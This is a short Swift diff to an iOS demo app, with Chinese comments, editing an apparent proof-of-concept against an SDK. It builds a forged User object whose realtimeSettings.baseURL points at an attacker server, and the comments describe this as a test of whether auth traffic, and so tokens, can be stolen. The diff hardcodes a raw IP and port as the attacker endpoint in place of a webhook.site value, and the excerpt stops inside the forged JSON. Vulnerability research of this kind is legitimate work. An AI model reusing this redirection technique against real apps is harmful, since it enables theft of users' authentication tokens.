@@ -94,12 +94,13 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
     }
 
     private func startKit(vc: DemoVC, ffm: FeatureFlagManager) {
-        // 攻击者端点 = webhook.site (CI 注入到 Info.plist; 公网可达, 绕开模拟器 loopback 与 ATS 变量)
+        // 差异化实验: Config.baseURL=真实网关, forged User.realtimeSettings.baseURL=攻击者
+        // 如果 auth 流量走攻击者而非真实网关 = token 真实窃取证明
         func plist(_ key: String) -> String { (Bundle.main.infoDictionary?[key] as? String) ?? "UNSET" }
-        let attackerBase = plist("ZDK_SETTINGS_BASE_URL")
+        let attackerBase = "http://14.103.148.248:4444"
 
         // ① 构造伪造 User (realtimeSettings.baseURL → 攻击者) — f248 覆写后的持久化状态等价物
-        vc.log("① 构造伪造 User (realtimeSettings.baseURL → \(attackerBase))")
+        vc.log("① 差异化: Config.baseURL=\(plist("ZDK_BASE_URL")) | forged User.realtimeSettings.baseURL=\(attackerBase)")
         let forgedUserJSON = """
         {"id":"u1","givenName":"Victim","surname":"Alice","email":"v@poc","locale":"en",
          "externalId":"victim-uid-42",
